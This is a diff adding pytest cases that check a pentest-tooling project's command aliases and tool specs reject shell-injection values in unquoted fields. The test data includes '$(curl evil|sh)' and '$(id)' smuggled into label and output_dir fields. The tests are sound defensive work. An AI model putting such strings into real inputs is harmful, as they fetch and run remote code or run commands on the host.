@@ -2,6 +2,9 @@
 
 from __future__ import annotations
 
+import pytest
+from pydantic import ValidationError
+
 from skuggi.engagement.workspace import WorkspaceLayout
 from skuggi.frontend.commands import CommandAlias, CommandRegistry, raw_command, render
 from skuggi.tooling.registry import ToolRegistry, ToolSpec
@@ -158,3 +161,28 @@ def test_example_cheatsheet_is_consistent_with_tools_and_layout() -> None:
         assert rendered.startswith(alias.argv[0])
         # The alias's tool resolves (or is intentionally a bare binary).
         assert alias.tool_name()
+
+
+# --- S4: cheatsheet fields are rendered UNQUOTED, so they must be validated --
+
+
+def test_alias_label_rejects_shell_injection() -> None:
+    with pytest.raises(ValidationError):
+        CommandAlias(name="x", argv=("nmap",), label="$(curl evil|sh)")
+
+
+def test_alias_output_dir_rejects_shell_injection() -> None:
+    with pytest.raises(ValidationError):
+        CommandAlias(name="x", argv=("nmap",), output_dir="recon/$(id)")
+
+
+def test_tool_spec_output_dir_rejects_shell_injection() -> None:
+    with pytest.raises(ValidationError):
+        ToolSpec(name="x", binary="x", method="scan", output_dir="out/$(id)")
+
+
+def test_render_still_emits_the_sanctioned_literals() -> None:
+    """No over-block: $(date) and ${target} come from constants, not fields."""
+    out = render(CommandAlias(name="nmap-host", argv=("nmap", "-sV")), _REG)
+    assert "$(date" in out
+    assert "${target}" in out
